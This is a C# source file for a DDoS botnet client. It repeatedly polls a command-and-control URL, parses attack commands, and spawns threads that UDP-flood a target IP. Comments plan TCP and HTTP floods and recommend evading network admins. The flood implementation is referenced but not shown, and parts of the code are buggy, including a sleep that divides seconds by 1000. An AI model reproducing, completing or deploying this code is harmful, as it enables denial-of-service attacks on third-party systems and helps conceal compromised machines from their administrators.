using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Threading;


/*
 * Some things need to be changed:
 * 
 * 1. cncUrl needs to be changed to the EXACT uri of where the commands are being pushed to
 * 2. TODO
 * 
 * For the future: 
 * The server will have a bot count based on different IP's that request the resource. 
 * The server will probably be written in Python(Flask) or Ruby (TCPServer or TCPSocket)
 * Ruby minimal http server: http://practicingruby.com/articles/implementing-an-http-file-server
 * 
 * Commands (something like this):
 * UDP flood: udp target time threads
 * TCP flood: tcp target port threads time
 * HTTP flood: http target time threads
 * Update URL: urlup newurl.com
 * 
 */
namespace HttpBotnetClient
{
    class Client
    {
        static void Main(string[] args)
        {

            string cncUrl = "cnc.fuckme.com:port/resource";
            string prevCmd = "";
            string dataRecvd = "";

            // Create WebClient for fetching commands
            /*
             * Try to keep the url short. We don't want to raise any red flags
             * with network admins.
             */
            WebClient client = new WebClient();

            while (true)
            {
                try
                {
                    byte[] bytesIn = client.DownloadData(cncUrl);
                    dataRecvd = Encoding.ASCII.GetString(bytesIn);
                    #if DEBUG
                        Console.WriteLine(dataRecvd);
                    #endif
                }
                catch (WebException we)
                {
                    Console.WriteLine(we.Message);
                    Console.Write("WebException caught, trying again in 3 seconds");
                    clientSleep(3);
                    continue;  // Do it again
                }

                if (prevCmd.Equals(dataRecvd)) continue;

                prevCmd = dataRecvd;

                string[] data = dataRecvd.Split(' ');
                IPAddress target = IPAddress.Parse(data[1]);
                int time = Int32.Parse(data[3]);

                
                // Null command (wait for one)
                if (dataRecvd.Equals("NONE"))
                {
                    clientSleep(3);
                } else if (data[0] == "udp" && data.Length == 4) {
                    UdpFlood(target, time, Int32.Parse(data[2]));
                }




            }
        }
        static void clientSleep(int secs)
        {
            Thread.Sleep(secs / 1000);
        }

        // Resolves a URL and returns an IPAddress
        static IPAddress resolve(string website)
        {
            IPHostEntry hostInfo = Dns.GetHostEntry(website);
            IPAddress addr = hostInfo.AddressList[0];
            return addr;
        }

        static void UdpFlood(IPAddress target, int time, int threads)
        {
            Floods flooder = new Floods();
            for (int i=0; i < threads; i++)
            {
                // The only way I could figure out how to use params in a new thread was with a lambda
                Thread thread = new Thread(() => flooder.udpf(target, time));
                thread.Start();
            }
        }

    }
}
